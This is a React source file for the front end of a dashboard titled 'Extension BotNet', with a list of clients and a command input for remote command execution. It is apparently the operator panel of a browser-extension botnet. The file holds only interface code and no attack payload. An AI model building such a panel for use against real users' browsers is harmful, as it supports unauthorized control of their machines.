import React from 'react';
import {NextUIProvider} from "@nextui-org/react";
import ClientList from './components/ClientList';
import CommandInput from './components/CommandInput';
import {
    QueryClient,
    QueryClientProvider,
} from '@tanstack/react-query'

// Create a client
const queryClient = new QueryClient()

function QueryClientProviderWrapper() {
    return (
        <QueryClientProvider client={queryClient}>
            <NextUIProvider>
                <main className="dark bg-background text-foreground min-h-screen min-w-screen flex items-center justify-center">
                    <App />
                </main>
            </NextUIProvider>
        </QueryClientProvider>
    );
}

function App() {
    return (
        <div className="main-wrapper w-full xl:w-auto p-6">
            <h1 className="font-black text-4xl">Extension BotNet</h1>
            <h2 className="font-bold text-2xl text-success mb-10">$> Remote Command Execution</h2>
            <section className="body-wrapper flex xl:gap-3 gap-6 flex-wrap justify-center xl:justify-start">
                <ClientList />
                <CommandInput />
            </section>
        </div>
    );
}

export default QueryClientProviderWrapper;
